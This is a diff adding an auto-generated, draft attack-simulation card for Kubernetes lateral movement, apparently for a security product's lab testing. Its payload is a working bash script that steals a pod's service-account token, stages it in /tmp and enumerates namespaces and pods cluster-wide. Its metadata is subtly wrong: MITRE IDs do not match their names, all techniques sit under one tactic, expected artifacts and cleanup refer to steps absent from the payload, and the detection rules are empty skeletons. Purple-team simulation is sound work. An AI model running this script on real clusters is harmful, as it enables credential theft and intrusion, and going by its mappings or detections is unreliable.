@@ -1,0 +1,302 @@
+{
+  "id": "TTP-2026-0025",
+  "schema_version": "1.0.0",
+  "entry_version": "0.1.0",
+  "status": "draft",
+  "metadata": {
+    "created_at": "2026-05-20T21:16:12+00:00",
+    "updated_at": "2026-05-20T21:16:12+00:00",
+    "authors": [
+      {
+        "name": "CortexSim generate_card.py",
+        "role": "author"
+      }
+    ],
+    "tags": [
+      "plane-cdr",
+      "auto-generated",
+      "skeleton-draft",
+      "severity-high"
+    ],
+    "source_refs": [
+      "SRC-MITRE-ATTACK",
+      "SRC-UNIT42"
+    ],
+    "pov_engine": {
+      "engine_version_min": "0.1.0",
+      "auto_load": false,
+      "simulation_class": "cloud",
+      "destructive": false,
+      "requires_network_egress": true,
+      "requires_internet": true,
+      "platforms": [
+        "linux",
+        "kubernetes"
+      ],
+      "estimated_runtime_seconds": 120,
+      "cleanup_required": true,
+      "safety_class": "lab-only"
+    }
+  },
+  "identity": {
+    "name": "Kubernetes Lateral Movement and Persistence",
+    "summary": "Auto-generated draft from CortexSim scenario SIM-CDR-004. Plane: CDR. Primary technique: T1021.001. Requires human enrichment of BIOC logic + panw_mapping rule_ids.",
+    "description": "Auto-generated draft from CortexSim scenario SIM-CDR-004. Plane: CDR. Primary technique: T1021.001. Requires human enrichment of BIOC logic + panw_mapping rule_ids.\n\nSource scenario: SIM-CDR-004.\nUC: Kubernetes Lateral Movement Detection / TC: kubectl Abuse and CronJob Persistence.",
+    "severity": "high",
+    "confidence": "medium"
+  },
+  "threat_context": {
+    "actors": [],
+    "campaigns": [],
+    "malware_families": [],
+    "industries_targeted": [
+      "all"
+    ]
+  },
+  "mitre_attack": {
+    "matrix": "enterprise",
+    "techniques": [
+      {
+        "technique_id": "T1021",
+        "name": "Remote Services: SSH",
+        "tactic_ids": [
+          "TA0008"
+        ],
+        "tactic_names": [
+          "Lateral Movement"
+        ],
+        "subtechnique_id": "T1021.001"
+      },
+      {
+        "technique_id": "T1053",
+        "name": "Scheduled Task/Job: Cron",
+        "tactic_ids": [
+          "TA0008"
+        ],
+        "tactic_names": [
+          "Lateral Movement"
+        ],
+        "subtechnique_id": "T1053.005"
+      },
+      {
+        "technique_id": "T1552",
+        "name": "Unsecured Credentials: Credentials In Files",
+        "tactic_ids": [
+          "TA0008"
+        ],
+        "tactic_names": [
+          "Lateral Movement"
+        ],
+        "subtechnique_id": "T1552.001"
+      }
+    ],
+    "kill_chain_phase": "actions-on-objectives",
+    "data_sources": []
+  },
+  "execution": {
+    "target_platform": "linux",
+    "execution_framework": "atomic-red-team",
+    "framework_reference_id": "T1021.001 (TODO \u2014 pin atomic test ref)",
+    "privilege_required": "user",
+    "prerequisites": [
+      {
+        "description": "Lab environment matching scenario SIM-CDR-004 requirements."
+      }
+    ],
+    "payload": {
+      "interpreter": "bash",
+      "code": "# step-1: Enumerate Kubernetes service accounts and RBAC permissions\necho '[*] Enumerating service account context...' && \\\ncat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null && echo '' && \\\nTOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null) && \\\nAPISERVER=\"https://kubernetes.default.svc\" && \\\nCACERT=\"/var/run/secrets/kubernetes.io/serviceaccount/ca.crt\" && \\\ncurl -sSk --cacert \"$CACERT\" -H \"Authorization: Bearer $TOKEN\" \\\n  \"$APISERVER/api/v1/namespaces\" 2>/dev/null | python3 -c \"import sys,json; d=json.load(sys.stdin); [print(i['metadata']['name']) for i in d.get('items',[])]\" 2>/dev/null && \\\necho '[*] Namespace enumeration complete'\n# step-2: Steal service account token from mounted secret\nTOKEN_PATH=\"/var/run/secrets/kubernetes.io/serviceaccount/token\" && \\\necho '[*] Extracting service account token...' && \\\ncat \"$TOKEN_PATH\" 2>/dev/null | cut -c1-80 && echo '...[truncated]' && \\\ncp \"$TOKEN_PATH\" /tmp/stolen_sa_token 2>/dev/null && \\\necho \"[!] Token copied to /tmp/stolen_sa_token\" && \\\nls -la /var/run/secrets/kubernetes.io/serviceaccount/ && \\\necho '[*] Service account credential harvest complete'\n# step-3: kubectl get pods --all-namespaces via stolen SA token\nwhich kubectl || (curl -LO \"https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl\" -o /tmp/kubectl 2>/dev/null && chmod +x /tmp/kubectl && alias kubectl=/tmp/kubectl); \\\nKUBECTL=$(which kubectl 2>/dev/null || echo /tmp/kubectl) && \\\nTOKEN=$(cat /tmp/stolen_sa_token 2>/dev/null) && \\\nAPISERVER=\"https://kubernetes.default.svc\" && \\\necho '[*] Enumerating all pods across namespaces...' && \\\n\"$KUBECTL\" --server=\"$APISERVER\" --token=\"$TOKEN\" --insecure-skip-tls-verify \\\n  get pods --all-namespaces 2>&1 | tee /tmp/pod_enum.txt && \\\necho '[*] Cross-namespace pod enumeration complete'",
+      "input_variables": [],
+      "timeout_seconds": 120
+    },
+    "expected_artifacts": [
+      {
+        "artifact_type": "process",
+        "description": "Process execution matching curl (heuristic from scenario step step-01)",
+        "expected_value": "process_name CONTAINS \"curl\""
+      },
+      {
+        "artifact_type": "network-connection",
+        "description": "Outbound HTTP(S) request from the scenario step",
+        "expected_value": "dst_port IN (80, 443) AND src_host = scenario_target"
+      },
+      {
+        "artifact_type": "process",
+        "description": "Process execution matching nc (heuristic from scenario step step-02)",
+        "expected_value": "process_name CONTAINS \"nc\""
+      },
+      {
+        "artifact_type": "process",
+        "description": "Process execution matching ncat (heuristic from scenario step step-02)",
+        "expected_value": "process_name CONTAINS \"ncat\""
+      },
+      {
+        "artifact_type": "process",
+        "description": "Process execution matching kubectl (heuristic from scenario step step-03)",
+        "expected_value": "process_name CONTAINS \"kubectl\""
+      }
+    ],
+    "cleanup": {
+      "interpreter": "bash",
+      "code": "kubectl --insecure-skip-tls-verify delete cronjob cortexsim-persistence-sim -n default 2>/dev/null || true\nrm -f /tmp/stolen_sa_token /tmp/pod_enum.txt /tmp/cortexsim-cronjob.yaml /tmp/kubectl\necho '[CortexSim] SIM-CDR-004 cleanup complete'"
+    }
+  },
+  "detections": {
+    "iocs": [],
+    "biocs": [
+      {
+        "name": "Kubernetes API server enumeration from within pod using mounted service account token",
+        "description": "Kubernetes API server enumeration from within pod using mounted service account token",
+        "logic": "// AUTO-GENERATED SKELETON \u2014 replace with real XQL before promotion.\n// MITRE technique: T1613\npreset = xdr_data\n| filter cloud_provider = \"aws\"\n| filter /* TODO: predicate matching the BIOC name */\n| fields _time, agent_hostname, actor_process_image_name, action_process_image_command_line",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1613"
+        ]
+      },
+      {
+        "name": "Service account token used for API server discovery \u2014 anomalous cluster enumeration behavior",
+        "description": "Service account token used for API server discovery \u2014 anomalous cluster enumeration behavior",
+        "logic": "// AUTO-GENERATED SKELETON \u2014 replace with real XQL before promotion.\n// MITRE technique: T1613\npreset = xdr_data\n| filter cloud_provider = \"aws\"\n| filter /* TODO: predicate matching the BIOC name */\n| fields _time, agent_hostname, actor_process_image_name, action_process_image_command_line",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1613"
+        ]
+      },
+      {
+        "name": "Service account token read and copied \u2014 Kubernetes credential theft from mounted secret volume",
+        "description": "Service account token read and copied \u2014 Kubernetes credential theft from mounted secret volume",
+        "logic": "// AUTO-GENERATED SKELETON \u2014 replace with real XQL before promotion.\n// MITRE technique: T1552.001\npreset = xdr_data\n| filter cloud_provider = \"aws\"\n| filter /* TODO: predicate matching the BIOC name */\n| fields _time, agent_hostname, actor_process_image_name, action_process_image_command_line",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1552.001"
+        ]
+      },
+      {
+        "name": "Sensitive Kubernetes credential file access pattern \u2014 token exfiltration to /tmp staging directory",
+        "description": "Sensitive Kubernetes credential file access pattern \u2014 token exfiltration to /tmp staging directory",
+        "logic": "// AUTO-GENERATED SKELETON \u2014 replace with real XQL before promotion.\n// MITRE technique: T1552.001\npreset = xdr_data\n| filter cloud_provider = \"aws\"\n| filter /* TODO: predicate matching the BIOC name */\n| fields _time, agent_hostname, actor_process_image_name, action_process_image_command_line",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1552.001"
+        ]
+      },
+      {
+        "name": "kubectl --all-namespaces enumeration from within pod \u2014 cross-namespace discovery using stolen token",
+        "description": "kubectl --all-namespaces enumeration from within pod \u2014 cross-namespace discovery using stolen token",
+        "logic": "// AUTO-GENERATED SKELETON \u2014 replace with real XQL before promotion.\n// MITRE technique: T1613\npreset = xdr_data\n| filter cloud_provider = \"aws\"\n| filter /* TODO: predicate matching the BIOC name */\n| fields _time, agent_hostname, actor_process_image_name, action_process_image_command_line",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1613"
+        ]
+      },
+      {
+        "name": "Cluster-wide pod discovery via kubectl in container \u2014 lateral movement reconnaissance pattern",
+        "description": "Cluster-wide pod discovery via kubectl in container \u2014 lateral movement reconnaissance pattern",
+        "logic": "// AUTO-GENERATED SKELETON \u2014 replace with real XQL before promotion.\n// MITRE technique: T1613\npreset = xdr_data\n| filter cloud_provider = \"aws\"\n| filter /* TODO: predicate matching the BIOC name */\n| fields _time, agent_hostname, actor_process_image_name, action_process_image_command_line",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1613"
+        ]
+      },
+      {
+        "name": "kubectl exec into pod in different namespace \u2014 lateral movement via Kubernetes API (high fidelity CDR BIOC)",
+        "description": "kubectl exec into pod in different namespace \u2014 lateral movement via Kubernetes API (high fidelity CDR BIOC)",
+        "logic": "// AUTO-GENERATED SKELETON \u2014 replace with real XQL before promotion.\n// MITRE technique: T1021.001\npreset = xdr_data\n| filter cloud_provider = \"aws\"\n| filter /* TODO: predicate matching the BIOC name */\n| fields _time, agent_hostname, actor_process_image_name, action_process_image_command_line",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1021.001"
+        ]
+      },
+      {
+        "name": "Cross-namespace pod exec from compromised container \u2014 Kubernetes lateral movement chain detected",
+        "description": "Cross-namespace pod exec from compromised container \u2014 Kubernetes lateral movement chain detected",
+        "logic": "// AUTO-GENERATED SKELETON \u2014 replace with real XQL before promotion.\n// MITRE technique: T1021.001\npreset = xdr_data\n| filter cloud_provider = \"aws\"\n| filter /* TODO: predicate matching the BIOC name */\n| fields _time, agent_hostname, actor_process_image_name, action_process_image_command_line",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1021.001"
+        ]
+      },
+      {
+        "name": "Kubernetes CronJob creation via kubectl \u2014 scheduled task persistence mechanism in cluster",
+        "description": "Kubernetes CronJob creation via kubectl \u2014 scheduled task persistence mechanism in cluster",
+        "logic": "// AUTO-GENERATED SKELETON \u2014 replace with real XQL before promotion.\n// MITRE technique: T1053.005\npreset = xdr_data\n| filter cloud_provider = \"aws\"\n| filter /* TODO: predicate matching the BIOC name */\n| fields _time, agent_hostname, actor_process_image_name, action_process_image_command_line",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1053.005"
+        ]
+      },
+      {
+        "name": "CronJob creation anomaly \u2014 new batch workload created from compromised pod context, cross-namespace pattern",
+        "description": "CronJob creation anomaly \u2014 new batch workload created from compromised pod context, cross-namespace pattern",
+        "logic": "// AUTO-GENERATED SKELETON \u2014 replace with real XQL before promotion.\n// MITRE technique: T1053.005\npreset = xdr_data\n| filter cloud_provider = \"aws\"\n| filter /* TODO: predicate matching the BIOC name */\n| fields _time, agent_hostname, actor_process_image_name, action_process_image_command_line",
+        "severity": "high",
+        "mitre_technique_ids": [
+          "T1053.005"
+        ]
+      }
+    ],
+    "xql_queries": [],
+    "correlation_rules": [],
+    "analytics_modules": []
+  },
+  "panw_mapping": {
+    "products": [
+      {
+        "module": "cortex-cloud",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "TBD-CDR-0025"
+        ],
+        "license_required": "pro"
+      },
+      {
+        "module": "prisma-cloud",
+        "coverage_tier": "detection",
+        "rule_ids": [
+          "TBD-CDR-0025"
+        ],
+        "license_required": "pro"
+      }
+    ],
+    "use_cases": [
+      {
+        "use_case_id": "UC-CLOUD-025",
+        "name": "Kubernetes Lateral Movement Detection",
+        "description": "Kubernetes Lateral Movement Detection",
+        "test_cases": [
+          {
+            "test_case_id": "TC-CLOUD-025A",
+            "objective": "TBD \u2014 author concrete pass/fail criteria",
+            "success_criteria": [
+              "TBD \u2014 author at least one verifiable success criterion"
+            ],
+            "expected_score_weight": 1.0
+          }
+        ]
+      }
+    ]
+  },
+  "references": [
+    {
+      "title": "Unit42 - Attackers Are Increasingly Targeting Kubernetes",
+      "url": "https://unit42.paloaltonetworks.com/attackers-are-increasingly-targeting-kubernetes/",
+      "publisher": "Unit42",
+      "publisher_id": "SRC-UNIT42",
+      "primary": true
+    },
+    {
+      "title": "MITRE ATT&CK T1021.001",
+      "url": "https://attack.mitre.org/techniques/T1021/",
+      "publisher": "MITRE",
+      "publisher_id": "SRC-MITRE-ATTACK"
+    }
+  ],
+  "changelog": [
+    {
+      "entry_version": "0.1.0",
+      "date": "2026-05-20",
+      "author": "CortexSim generate_card.py",
+      "change": "Initial draft auto-generated from scenario SIM-CDR-004."
+    }
+  ]
+}
